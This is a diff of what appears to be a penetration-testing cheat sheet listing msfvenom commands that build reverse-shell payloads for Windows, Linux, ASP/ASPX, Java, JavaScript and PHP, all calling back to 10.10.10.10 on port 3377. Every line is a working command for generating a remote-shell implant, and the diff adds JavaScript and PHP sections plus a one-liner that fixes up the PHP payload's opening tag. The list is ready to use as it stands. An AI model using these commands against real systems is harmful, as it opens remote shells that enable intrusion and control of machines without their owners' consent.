@@ -2,35 +2,38 @@
 
 ## Windows
 #Stageless Payloads
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/v-shell.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/v-shell.aspx
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/shell.exe
 
 #Staged Payloads
-msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/sv-shell.exe
-msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/sv-shell.aspx
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/s-shell.exe
 
 ##Linux
-msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.py
-msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.sh
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.sh
 
 #Staged Payloads
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x86.elf
-msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x64.elf
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > ~/reverse-shell/s-shell-x86.elf
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > ~/reverse-shell/s-shell-x64.elf
 
 #Stageless Payloads
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x86.elf
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x64.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > ~/reverse-shell/shell-x86.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > ~/reverse-shell/shell-x64.elf
 
-##Web
-msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=3377 -f raw > shell.php
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war > shell.war
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > shell.jsp
-msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > s-shell.asp
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > shell.asp
+##ASP/ASPX
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > ~/reverse-shell/s-shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > ~/reverse-shell/shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/shell.aspx
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/s-shell.aspx
 
 ##Java
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.war
-msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war -o ~/reverse-shell/v-shell2.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war > ~/reverse-shell/shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.jsp
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war -o ~/reverse-shell/shell2.war
 
-#unpack war file for jsp file
+##Javascript
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f js_le -e generic/none > ~/reverse-shell/shell-win.js
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 CMD=/bin/bash -f js_le -e generic/none > ~/reverse-shell/shell-lin.js
+
+##PHP
+msfvenom -p php/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.php
+cat ~/reverse-shell/shell.php | pbcopy && echo '<?php ' | tr -d '\n' > ~/reverse-shell/shell.php && pbpaste >> ~/reverse-shell/shell.php
